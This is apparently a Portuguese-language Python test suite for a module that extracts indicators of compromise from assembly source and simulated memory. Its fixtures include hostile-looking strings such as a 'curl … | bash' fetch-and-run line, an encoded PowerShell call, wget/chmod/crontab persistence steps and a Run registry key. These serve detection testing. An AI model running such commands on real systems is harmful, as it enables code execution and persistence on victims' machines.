"""Testes dos indicadores de compromisso lidos no fonte e na memória.

Os casos cobrem cada categoria, os falsos positivos que o módulo evita, a
leitura de literais (escapes e vírgulas), os comentários, o agrupamento, o
resumo e a varredura de memória com um leitor de mentira.
"""

import dataclasses
import unittest
from typing import Any, Dict, List

from asmx.examples import EXAMPLES
from asmx.iocs import IOC_KINDS, Ioc, extract, from_memory, group, strings_of, summary, to_dicts


def kinds_of(texto: Any, **kwargs: Any) -> List[str]:
    return [ioc.kind for ioc in extract(texto, **kwargs)]


def values_of(kind: str, texto: Any, **kwargs: Any) -> List[str]:
    return [ioc.value for ioc in extract(texto, **kwargs) if ioc.kind == kind]


def values_memoria(kind: str) -> List[str]:
    return [ioc.value for ioc in from_memory(LeitorFalso(MEMORIA)) if ioc.kind == kind]


class LeitorFalso:
    """Leitor de memória de mentira, com o mesmo contrato do ``Machine``."""

    def __init__(self, dados: bytes, base: int = 0x00400000) -> None:
        self.dados = dados
        self.base = base

    def rd8(self, addr: int) -> int:
        posicao = addr - self.base
        if 0 <= posicao < len(self.dados):
            return self.dados[posicao]
        return 0

    def read_mem(self, addr: int, size: int) -> int:
        valor = 0
        for i in range(size):
            valor |= self.rd8(addr + i) << (8 * i)
        return valor

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        letras: List[str] = []
        for i in range(limit):
            byte = self.rd8(addr + i)
            if byte == 0:
                break
            letras.append(chr(byte))
        return "".join(letras)


class LeitorSoMemoria:
    """Leitor que só oferece ``read_mem`` e ``read_cstring``."""

    def __init__(self, dados: bytes, base: int = 0x00400000) -> None:
        self.dados = dados
        self.base = base

    def read_mem(self, addr: int, size: int) -> int:
        valor = 0
        for i in range(size):
            posicao = addr + i - self.base
            byte = self.dados[posicao] if 0 <= posicao < len(self.dados) else 0
            valor |= byte << (8 * i)
        return valor

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        letras: List[str] = []
        for i in range(limit):
            posicao = addr + i - self.base
            byte = self.dados[posicao] if 0 <= posicao < len(self.dados) else 0
            if byte == 0:
                break
            letras.append(chr(byte))
        return "".join(letras)


class LeitorSoCstring:
    """Leitor que só sabe ler strings terminadas em zero."""

    def __init__(self, dados: bytes, base: int = 0x00400000) -> None:
        self.dados = dados
        self.base = base

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        letras: List[str] = []
        for i in range(limit):
            posicao = addr + i - self.base
            byte = self.dados[posicao] if 0 <= posicao < len(self.dados) else 0
            if byte == 0:
                break
            letras.append(chr(byte))
        return "".join(letras)


class LeitorSemCstring:
    """Leitor que só tem ``rd8`` — não serve para varrer a memória."""

    def rd8(self, addr: int) -> int:
        return 65 if addr < 0x00400010 else 0


class LeitorQuebrado:
    """Leitor cujo ``read_cstring`` sempre levanta exceção."""

    def rd8(self, addr: int) -> int:
        return 0

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        raise RuntimeError("memória corrompida")


#: Memória usada nos testes de :func:`from_memory`.
MEMORIA = (
    b"Ola, mundo!\x00"
    b"https://exemplo.com/x\x00"
    b"\x01\x02password=hunter2\x00"
    b"1.2.3.4\x00"
    b"ab\x00"
    b"segundo texto\x00"
)


class TestStringsOf(unittest.TestCase):
    """A leitura de literais de dados e de comentários."""

    def test_literal_com_aspas_duplas(self) -> None:
        self.assertEqual(strings_of('msg db "Ola, mundo!", 10'), [(1, "Ola, mundo!")])

    def test_literal_com_aspas_simples(self) -> None:
        self.assertEqual(strings_of("msg dq 'cinco'"), [(1, "cinco")])

    def test_virgula_concatena_literais(self) -> None:
        self.assertEqual(strings_of('db "ab", "cd"', min_length=2), [(1, "abcd")])

    def test_numero_entre_literais_quebra_a_concatenacao(self) -> None:
        fonte = 'msg db "Ola", 10, "mundo"'
        self.assertEqual(strings_of(fonte, min_length=2), [(1, "Ola"), (1, "mundo")])

    def test_escape_de_nova_linha(self) -> None:
        self.assertEqual(strings_of('db "a\\nb"', min_length=3), [(1, "a\nb")])

    def test_escape_de_tabulacao(self) -> None:
        self.assertEqual(strings_of('db "a\\tb"', min_length=3), [(1, "a\tb")])

    def test_escape_de_contrabarra(self) -> None:
        self.assertEqual(strings_of('db "C:\\\\Windows"', min_length=4), [(1, "C:\\Windows")])

    def test_escape_de_aspas(self) -> None:
        self.assertEqual(strings_of('db "diz \\"oi\\" agora"'), [(1, 'diz "oi" agora')])

    def test_escape_desconhecido_fica_como_esta(self) -> None:
        self.assertEqual(strings_of("db 'C:\\Windows'", min_length=4), [(1, "C:\\Windows")])

    def test_comentario_entra_por_padrao(self) -> None:
        self.assertEqual(strings_of("; nada aqui"), [(1, "nada aqui")])

    def test_comentario_pode_ser_excluido(self) -> None:
        self.assertEqual(strings_of("; nada aqui", include_comments=False), [])

    def test_comentario_so_com_marcador_e_ignorado(self) -> None:
        self.assertEqual(strings_of(";"), [])

    def test_min_length_filtra(self) -> None:
        self.assertEqual(strings_of('db "abcd"', min_length=5), [])
        self.assertEqual(strings_of('db "abcd"', min_length=4), [(1, "abcd")])

    def test_string_vazia_e_ignorada(self) -> None:
        self.assertEqual(strings_of('db ""', min_length=1), [])

    def test_string_so_de_separadores_e_ignorada(self) -> None:
        self.assertEqual(strings_of('db ",;:. -"', min_length=1), [])

    def test_varias_linhas_mantem_a_linha_de_cada_string(self) -> None:
        fonte = 'section .data\nmsg db "primeira"\n; segunda string\n'
        self.assertEqual(strings_of(fonte), [(2, "primeira"), (3, "segunda string")])

    def test_fonte_vazio(self) -> None:
        self.assertEqual(strings_of(""), [])
        self.assertEqual(strings_of("\n\n   \n"), [])

    def test_entrada_que_nao_e_texto(self) -> None:
        self.assertEqual(list(strings_of(None)), [])
        self.assertEqual(list(strings_of(b'db "abc"')), [])

    def test_texto_binario_nao_levanta(self) -> None:
        fonte = '\x00\x01\x02\xff\xfe db "ok" \x07' + chr(0x10FFFF) * 3
        self.assertIsInstance(strings_of(fonte), list)


class TestUrl(unittest.TestCase):
    """A categoria ``url``."""

    def test_url_https(self) -> None:
        self.assertEqual(values_of("url", 'db "https://exemplo.com/a"'), ["https://exemplo.com/a"])

    def test_url_http_em_comentario(self) -> None:
        self.assertEqual(values_of("url", "; baixe em http://x.org/y"), ["http://x.org/y"])

    def test_url_para_na_virgula_e_na_aspas(self) -> None:
        self.assertEqual(values_of("url", 'db "http://x.org/a", 0'), ["http://x.org/a"])

    def test_url_sem_ponto_final(self) -> None:
        self.assertEqual(values_of("url", "; veja https://exemplo.com."), ["https://exemplo.com"])

    def test_texto_sem_url(self) -> None:
        self.assertEqual(values_of("url", 'db "ftp://exemplo.com"'), [])


class TestIpv4(unittest.TestCase):
    """A categoria ``ipv4`` e os números que não são endereço."""

    def test_endereco_valido(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "10.0.0.1", 0'), ["10.0.0.1"])

    def test_endereco_no_meio_da_frase(self) -> None:
        self.assertEqual(values_of("ipv4", "; servidor 192.168.0.10 na rede"), ["192.168.0.10"])

    def test_cinco_octetos_e_recusado(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "1.2.3.4.5"'), [])
        self.assertEqual(values_of("ipv4", 'db "1.2.3.4.5.6"'), [])

    def test_octeto_acima_de_255_e_recusado(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "300.1.2.3"'), [])
        self.assertEqual(values_of("ipv4", 'db "1.2.3.999"'), [])

    def test_numero_de_versao_nao_e_endereco(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "versao 1.2"'), [])

    def test_ip_nao_vira_string(self) -> None:
        self.assertNotIn("string", kinds_of('db "10.0.0.1"'))


class TestDomain(unittest.TestCase):
    """A categoria ``domain`` e os nomes que não são domínio."""

    def test_dominio_simples(self) -> None:
        self.assertEqual(values_of("domain", 'db "exemplo.com"'), ["exemplo.com"])

    def test_dominio_com_subdominios(self) -> None:
        self.assertEqual(values_of("domain", 'db "api.exemplo.org.br"'), ["api.exemplo.org.br"])

    def test_dominio_maiusculo(self) -> None:
        self.assertEqual(values_of("domain", 'db "Exemplo.COM"'), ["Exemplo.COM"])

    def test_nome_de_arquivo_nao_e_dominio(self) -> None:
        self.assertEqual(values_of("domain", 'db "arquivo.asm"'), [])
        self.assertEqual(values_of("domain", "; nasm -f elf64 hello.asm"), [])
        self.assertEqual(values_of("domain", 'db "kernel32.lib"'), [])

    def test_nome_de_secao_nao_e_dominio(self) -> None:
        for secao in (".text", ".data", ".rodata", ".bss", "section .text"):
            with self.subTest(secao=secao):
                self.assertEqual(values_of("domain", secao), [])

    def test_arquivo_markdown_nao_e_dominio(self) -> None:
        self.assertEqual(values_of("domain", "; veja README.md e script.sh"), [])

    def test_dominio_dentro_de_url_nao_repete(self) -> None:
        self.assertEqual(values_of("domain", 'db "http://exemplo.com/x"'), [])

    def test_dominio_dentro_de_email_nao_repete(self) -> None:
        self.assertEqual(values_of("domain", 'db "usuario@exemplo.com"'), [])


class TestEmail(unittest.TestCase):
    """A categoria ``email``."""

    def test_email_valido(self) -> None:
        self.assertEqual(values_of("email", 'db "usuario@exemplo.com"'), ["usuario@exemplo.com"])

    def test_arroba_do_att_nao_e_email(self) -> None:
        self.assertEqual(values_of("email", "\t.type\tmain, @function"), [])

    def test_arroba_sem_dominio_nao_e_email(self) -> None:
        self.assertEqual(values_of("email", 'db "a@b"'), [])


class TestPaths(unittest.TestCase):
    """As categorias ``path_unix`` e ``path_windows``."""

    def test_caminho_unix(self) -> None:
        self.assertEqual(values_of("path_unix", 'db "/etc/passwd", 0'), ["/etc/passwd"])

    def test_caminho_unix_curto(self) -> None:
        self.assertEqual(values_of("path_unix", 'db "/tmp/x"'), ["/tmp/x"])

    def test_caminho_unix_de_executavel(self) -> None:
        self.assertEqual(values_of("path_unix", 'db "/bin/sh"'), ["/bin/sh"])

    def test_divisao_nao_e_caminho(self) -> None:
        self.assertEqual(values_of("path_unix", "mov rax, 100\ndiv rbx"), [])

    def test_caminho_windows_com_barras_escapadas(self) -> None:
        fonte = 'db "C:\\\\Windows\\\\System32\\\\cmd.exe", 0'
        self.assertEqual(values_of("path_windows", fonte), ["C:\\Windows\\System32\\cmd.exe"])

    def test_caminho_windows_com_barras_simples(self) -> None:
        fonte = "db 'C:\\Users\\rafael\\nota.txt', 0"
        self.assertEqual(values_of("path_windows", fonte), ["C:\\Users\\rafael\\nota.txt"])

    def test_caminho_windows_em_aspas_duplas_com_barra_simples(self) -> None:
        self.assertEqual(
            values_of("path_windows", 'db "C:\\Users\\rafael\\x"'), ["C:\\Users\\rafael\\x"]
        )

    def test_caminho_windows_com_espaco_no_meio(self) -> None:
        fonte = 'db "C:\\\\Program Files\\\\App\\\\x.dll"'
        self.assertEqual(values_of("path_windows", fonte), ["C:\\Program Files\\App\\x.dll"])

    def test_caminho_windows_para_antes_da_prosa(self) -> None:
        self.assertEqual(
            values_of("path_windows", "; fica em C:\\Windows e pronto"), ["C:\\Windows"]
        )

    def test_unc_com_servidor_e_compartilhamento(self) -> None:
        fonte = 'db "\\\\\\\\servidor\\\\share\\\\x", 0'
        self.assertEqual(values_of("path_windows", fonte), ["\\\\servidor\\share\\x"])

    def test_fallback_acha_caminho_no_comentario_com_barras_dobradas(self) -> None:
        fonte = "; baixa para C:\\\\Users\\\\rafael\\\\x.exe"
        self.assertEqual(values_of("path_windows", fonte), ["C:\\Users\\rafael\\x.exe"])

    def test_fallback_nao_duplica_o_caminho_do_literal(self) -> None:
        fonte = 'db "C:\\\\Windows\\\\System32", 0'
        self.assertEqual(len(values_of("path_windows", fonte)), 1)

    def test_pedaco_de_caminho_nao_sobra_no_relatorio(self) -> None:
        valores = values_of("path_windows", "db 'C:\\Users\\rafael\\nota.txt', 0")
        self.assertNotIn("C:\\Users", valores)

    def test_caminho_quebrado_vira_string_quando_nada_reconhece(self) -> None:
        self.assertEqual(values_of("string", 'db "\\\\etc\\\\pass"'), ["\\etc\\pass"])


class TestRegistry(unittest.TestCase):
    """A categoria ``registry``."""

    def test_hklm(self) -> None:
        fonte = 'db "HKLM\\\\Software\\\\Microsoft", 0'
        self.assertEqual(values_of("registry", fonte), ["HKLM\\Software\\Microsoft"])

    def test_hkcu(self) -> None:
        fonte = 'db "HKCU\\\\Software\\\\App", 0'
        self.assertEqual(values_of("registry", fonte), ["HKCU\\Software\\App"])

    def test_chave_current_version_run(self) -> None:
        fonte = 'db "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0'
        esperado = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        self.assertEqual(values_of("registry", fonte), [esperado])

    def test_current_version_run_sozinho(self) -> None:
        self.assertEqual(
            values_of("registry", 'db "CurrentVersion\\\\Run", 0'), ["CurrentVersion\\Run"]
        )

    def test_caminho_de_arquivo_nao_e_registro(self) -> None:
        self.assertEqual(values_of("registry", 'db "C:\\\\Windows\\\\System32"'), [])


class TestCommand(unittest.TestCase):
    """A categoria ``command``."""

    def test_cmd_e_powershell(self) -> None:
        fonte = 'db "cmd.exe /c powershell -enc AAA", 0'
        self.assertEqual(values_of("command", fonte), ["cmd.exe", "powershell"])

    def test_comandos_unix(self) -> None:
        fonte = 'db "curl http://x.org/a | bash", 0'
        self.assertEqual(values_of("command", fonte), ["bash", "curl"])

    def test_sh_dentro_do_caminho(self) -> None:
        self.assertIn("sh", values_of("command", 'db "/bin/sh"'))

    def test_nome_de_arquivo_com_extensao_sh_nao_e_comando(self) -> None:
        self.assertEqual(values_of("command", "; veja README.md e script.sh"), [])

    def test_executavel_completo_e_preferido(self) -> None:
        self.assertEqual(values_of("command", 'db "sh.exe -c id"'), ["sh.exe"])

    def test_mnemonico_push_nao_e_comando_sh(self) -> None:
        self.assertEqual(values_of("command", "push rbx\npop rbx"), [])

    def test_mnemonico_shl_nao_e_comando_sh(self) -> None:
        self.assertEqual(values_of("command", "shl rax, 1\nshr rbx, 2"), [])

    def test_inc_nao_e_comando_nc(self) -> None:
        self.assertEqual(values_of("command", "inc rax\ndec rbx"), [])

    def test_wget_chmod_e_crontab(self) -> None:
        fonte = 'db "wget -O x chmod +x x crontab -e", 0'
        self.assertEqual(values_of("command", fonte), ["chmod", "crontab", "wget"])


class TestExtension(unittest.TestCase):
    """A categoria ``extension``."""

    def test_extensoes_sensiveis(self) -> None:
        fonte = 'db "a.exe b.dll c.ps1 d.locked", 0'
        self.assertEqual(values_of("extension", fonte), [".dll", ".exe", ".locked", ".ps1"])

    def test_extensao_em_maiusculas_vira_minuscula(self) -> None:
        self.assertEqual(values_of("extension", 'db "x.EXE"'), [".exe"])

    def test_extensoes_inocentes_ficam_de_fora(self) -> None:
        self.assertEqual(values_of("extension", 'db "a.asm b.txt c.c d.o"'), [])

    def test_so_compartilhado_em_biblioteca(self) -> None:
        self.assertEqual(values_of("extension", 'db "libc.so.6"'), [".so"])


class TestKeyword(unittest.TestCase):
    """A categoria ``keyword``."""

    def test_palavras_em_ingles(self) -> None:
        fonte = 'db "password token secret wallet bitcoin", 0'
        esperado = ["bitcoin", "password", "secret", "token", "wallet"]
        self.assertEqual(values_of("keyword", fonte), esperado)

    def test_palavras_em_portugues(self) -> None:
        self.assertEqual(values_of("keyword", 'db "senha do admin", 0'), ["admin", "senha"])

    def test_valor_guardado_como_apareceu(self) -> None:
        self.assertEqual(values_of("keyword", 'db "SENHA"'), ["SENHA"])

    def test_botao_nao_e_bot(self) -> None:
        self.assertEqual(values_of("keyword", 'db "aperte o botão"'), [])

    def test_administrador_nao_e_admin(self) -> None:
        self.assertEqual(values_of("keyword", 'db "administrador do sistema"'), [])

    def test_digito_depois_da_palavra_conta(self) -> None:
        self.assertEqual(values_of("keyword", 'db "password1"'), ["password"])

    def test_keylog_e_ransom(self) -> None:
        self.assertEqual(values_of("keyword", 'db "keylog ransom", 0'), ["keylog", "ransom"])


class TestExtract(unittest.TestCase):
    """O comportamento geral de :func:`extract`."""

    def test_fonte_vazia(self) -> None:
        self.assertEqual(extract(""), [])
        self.assertEqual(extract("\n\n"), [])

    def test_entrada_que_nao_e_texto(self) -> None:
        self.assertEqual(extract(None), [])
        self.assertEqual(extract(42), [])
        self.assertEqual(extract(b'db "http://x.org"'), [])

    def test_texto_binario_nao_levanta(self) -> None:
        fonte = "\x00\x01\x02\x03" * 50 + 'db "C:\\\\Windows\\\\x"\x7f\x1b'
        self.assertIsInstance(extract(fonte), list)

    def test_string_comum_vira_string(self) -> None:
        iocs = extract('msg db "Ola, mundo!", 10')
        self.assertEqual([(ioc.kind, ioc.value) for ioc in iocs], [("string", "Ola, mundo!")])

    def test_string_que_caiu_em_categoria_nao_volta_como_string(self) -> None:
        self.assertNotIn("string", kinds_of('db "http://exemplo.com/x"'))

    def test_deduplicacao_guarda_a_primeira_linha(self) -> None:
        fonte = 'a db "http://x.org/a"\nb db "http://x.org/a"\n'
        iocs = extract(fonte)
        self.assertEqual(len(iocs), 1)
        self.assertEqual(iocs[0].line, 1)

    def test_deduplicacao_por_categoria_e_valor(self) -> None:
        fonte = 'a db "cmd.exe"\nb db "cmd.exe"\n'
        valores = [(ioc.kind, ioc.value, ioc.line) for ioc in extract(fonte)]
        self.assertEqual(valores, [("command", "cmd.exe", 1), ("extension", ".exe", 1)])

    def test_comentarios_podem_ser_excluidos(self) -> None:
        fonte = 'db "ok"\n; http://x.org/a\n'
        self.assertEqual(values_of("url", fonte), ["http://x.org/a"])
        self.assertEqual(values_of("url", fonte, include_comments=False), [])

    def test_min_length_vale_para_a_classificacao(self) -> None:
        self.assertEqual(values_of("keyword", 'db "root"', min_length=5), [])
        self.assertEqual(values_of("keyword", 'db "root"', min_length=4), ["root"])

    def test_linha_e_o_numero_da_linha_do_fonte(self) -> None:
        fonte = 'section .data\n\nmsg db "http://x.org/a"\n'
        self.assertEqual(extract(fonte)[0].line, 3)

    def test_contexto_sem_espacos_duplicados(self) -> None:
        fonte = 'msg    db    "http://x.org/a"        ; nota'
        self.assertEqual(extract(fonte)[0].context, 'msg db "http://x.org/a" ; nota')

    def test_ordem_por_linha_e_por_categoria(self) -> None:
        fonte = 'a db "/etc/passwd"\nb db "http://x.org/a"\n'
        self.assertEqual(
            [(ioc.line, ioc.kind) for ioc in extract(fonte)], [(1, "path_unix"), (2, "url")]
        )

    def test_todas_as_categorias_saem_de_ioc_kinds(self) -> None:
        fonte = (
            'db "http://x.org/a", 0\n'
            'db "10.0.0.1", 0\n'
            'db "exemplo.com", 0\n'
            'db "a@exemplo.com", 0\n'
            'db "/etc/passwd", 0\n'
            'db "C:\\\\Windows", 0\n'
            'db "HKLM\\\\Software", 0\n'
            'db "cmd.exe", 0\n'
            'db "x.enc", 0\n'
            'db "senha", 0\n'
            'db "texto comum", 0\n'
        )
        self.assertEqual(set(kinds_of(fonte)), set(IOC_KINDS))
        for ioc in extract(fonte):
            self.assertIn(ioc.kind, IOC_KINDS)
            self.assertEqual(ioc.to_dict()["label"], IOC_KINDS[ioc.kind])


class TestGroupEToDicts(unittest.TestCase):
    """O agrupamento e a conversão para dicionário."""

    def test_group_sem_repetir_valor(self) -> None:
        iocs = [
            Ioc("url", "http://x.org/a", 1),
            Ioc("url", "http://x.org/a", 2),
            Ioc("url", "http://x.org/b", 3),
        ]
        agrupado = group(iocs)
        self.assertEqual(
            [ioc.value for ioc in agrupado["url"]], ["http://x.org/a", "http://x.org/b"]
        )
        self.assertEqual(agrupado["url"][0].line, 1)

    def test_group_na_ordem_de_ioc_kinds(self) -> None:
        iocs = [Ioc("string", "texto", 1), Ioc("url", "http://x.org/a", 2)]
        self.assertEqual(list(group(iocs)), ["url", "string"])

    def test_group_de_lista_vazia(self) -> None:
        self.assertEqual(group([]), {})
        self.assertEqual(to_dicts([]), {})

    def test_to_dicts_traz_o_rotulo_em_portugues(self) -> None:
        convertido = to_dicts([Ioc("ipv4", "10.0.0.1", 4, "db 10.0.0.1")])
        self.assertEqual(
            convertido["ipv4"][0],
            {
                "kind": "ipv4",
                "value": "10.0.0.1",
                "line": 4,
                "context": "db 10.0.0.1",
                "label": "Endereço IPv4",
            },
        )

    def test_to_dict_do_ioc(self) -> None:
        dicionario: Dict[str, Any] = Ioc("url", "http://x.org", 7).to_dict()
        self.assertEqual(sorted(dicionario), ["context", "kind", "label", "line", "value"])
        self.assertEqual(dicionario["label"], "URL")

    def test_ioc_e_imutavel(self) -> None:
        ioc = Ioc("url", "http://x.org", 1)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            ioc.value = "outro"  # type: ignore[misc]

    def test_todas_as_categorias_tem_rotulo(self) -> None:
        for kind in IOC_KINDS:
            with self.subTest(kind=kind):
                self.assertTrue(IOC_KINDS[kind])
                self.assertEqual(Ioc(kind, "x", 1).to_dict()["label"], IOC_KINDS[kind])


class TestSummary(unittest.TestCase):
    """O resumo de uma linha."""

    def test_resumo_com_varias_categorias(self) -> None:
        iocs = [
            Ioc("url", "http://x.org/a", 1),
            Ioc("url", "http://x.org/b", 2),
            Ioc("ipv4", "10.0.0.1", 3),
            Ioc("path_unix", "/etc/passwd", 4),
        ]
        self.assertEqual(summary(iocs), "4 indicador(es): 2 URL, 1 IPv4, 1 caminho")

    def test_resumo_de_um_so(self) -> None:
        self.assertEqual(summary([Ioc("url", "http://x.org", 1)]), "1 indicador(es): 1 URL")

    def test_resumo_vazio(self) -> None:
        self.assertEqual(summary([]), "0 indicador(es)")

    def test_resumo_do_extract(self) -> None:
        resumo = summary(extract('db "cmd.exe"'))
        self.assertTrue(resumo.startswith("2 indicador(es): 1 comando"))
        self.assertIn("1 extensão", resumo)


class TestFromMemory(unittest.TestCase):
    """A varredura de strings na memória simulada."""

    def test_acha_string_simples(self) -> None:
        self.assertIn("Ola, mundo!", [ioc.value for ioc in from_memory(LeitorFalso(MEMORIA))])

    def test_classifica_url(self) -> None:
        self.assertIn("https://exemplo.com/x", values_memoria("url"))

    def test_classifica_palavra_chave(self) -> None:
        self.assertIn("password", values_memoria("keyword"))

    def test_classifica_ip(self) -> None:
        self.assertIn("1.2.3.4", values_memoria("ipv4"))

    def test_todas_as_linhas_sao_zero(self) -> None:
        for ioc in from_memory(LeitorFalso(MEMORIA)):
            self.assertEqual(ioc.line, 0)
            self.assertTrue(ioc.context)

    def test_min_length(self) -> None:
        self.assertEqual(from_memory(LeitorFalso(MEMORIA), min_length=25), [])

    def test_nao_repete_valor(self) -> None:
        dados = b"http://x.org/a\x00http://x.org/a\x00"
        self.assertEqual(len(from_memory(LeitorFalso(dados))), 1)

    def test_sem_read_cstring_devolve_vazio(self) -> None:
        self.assertEqual(from_memory(LeitorSemCstring()), [])

    def test_leitor_quebrado_nao_levanta(self) -> None:
        self.assertEqual(from_memory(LeitorQuebrado()), [])

    def test_leitor_so_com_read_mem(self) -> None:
        self.assertIn("Ola, mundo!", [ioc.value for ioc in from_memory(LeitorSoMemoria(MEMORIA))])

    def test_leitor_so_com_read_cstring(self) -> None:
        self.assertIn("Ola, mundo!", [ioc.value for ioc in from_memory(LeitorSoCstring(MEMORIA))])

    def test_memoria_vazia(self) -> None:
        self.assertEqual(from_memory(LeitorFalso(b"\x00" * 64)), [])

    def test_memoria_binaria(self) -> None:
        self.assertEqual(from_memory(LeitorFalso(bytes(range(1, 20)) * 4)), [])

    def test_objeto_qualquer_devolve_vazio(self) -> None:
        self.assertEqual(from_memory(object()), [])
        self.assertEqual(from_memory(None), [])

    def test_janela_de_varredura(self) -> None:
        dados = b"primeiro\x00segundo\x00"
        self.assertEqual(
            [ioc.value for ioc in from_memory(LeitorFalso(dados), size=9)], ["primeiro"]
        )

    def test_size_zero(self) -> None:
        self.assertEqual(from_memory(LeitorFalso(MEMORIA), size=0), [])

    def test_base_diferente(self) -> None:
        leitor = LeitorFalso(b"outro texto\x00", base=0x1000)
        self.assertEqual([ioc.value for ioc in from_memory(leitor, base=0x1000)], ["outro texto"])


class TestExemplos(unittest.TestCase):
    """Os exemplos do pacote passam pelo extrator."""

    def test_linux_hello_traz_ola_mundo(self) -> None:
        iocs = extract(EXAMPLES["linux-hello"]["code"])
        self.assertIn("Ola, mundo!", [ioc.value for ioc in iocs if ioc.kind == "string"])

    def test_windows_hello_traz_as_strings_de_console(self) -> None:
        iocs = extract(EXAMPLES["windows-hello"]["code"])
        valores = [ioc.value for ioc in iocs if ioc.kind == "string"]
        self.assertIn("Ola do Windows!", valores)
        # O exemplo não cita caminho do Windows nenhum: nada de ``C:\``.
        self.assertEqual([ioc.value for ioc in iocs if ioc.kind == "path_windows"], [])

    def test_quebrado_traz_a_mensagem_com_acento(self) -> None:
        valores = [ioc.value for ioc in extract(EXAMPLES["quebrado"]["code"])]
        self.assertIn("Ação inválida", valores)
        self.assertIn("rafael", valores)

    def test_gcc_att_nao_tem_indicador(self) -> None:
        self.assertEqual(extract(EXAMPLES["gcc-att"]["code"]), [])

    def test_todos_os_exemplos_sao_classificaveis(self) -> None:
        for nome, exemplo in EXAMPLES.items():
            with self.subTest(exemplo=nome):
                iocs = extract(exemplo["code"])
                convertido = to_dicts(iocs)
                for ioc in iocs:
                    self.assertIn(ioc.kind, IOC_KINDS)
                    self.assertGreaterEqual(ioc.line, 1)
                for kind, lista in convertido.items():
                    self.assertIn(kind, IOC_KINDS)
                    self.assertTrue(lista)
                self.assertTrue(summary(iocs))

    def test_strings_of_dos_exemplos_mantem_o_tamanho_minimo(self) -> None:
        for nome, exemplo in EXAMPLES.items():
            with self.subTest(exemplo=nome):
                for linha, texto in strings_of(exemplo["code"]):
                    self.assertGreaterEqual(linha, 1)
                    self.assertGreaterEqual(len(texto.strip()), 4)


if __name__ == "__main__":
    unittest.main()
